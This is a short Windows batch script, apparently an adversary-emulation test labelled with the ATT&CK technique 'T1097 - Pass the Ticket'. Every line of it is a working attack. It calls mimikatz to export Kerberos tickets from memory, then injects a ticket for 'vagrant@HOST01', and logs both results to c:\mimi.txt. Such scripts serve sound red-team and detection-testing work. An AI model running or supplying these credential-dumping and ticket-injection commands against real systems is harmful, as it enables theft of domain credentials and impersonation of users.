@echo off

echo T1097 - Pass the Ticket
mimikatz "sekurlsa::tickets /export" exit >> c:\mimi.txt &
mimikatz "kerberos::ptt vagrant@HOST01" exit >> c:\mimi.txt &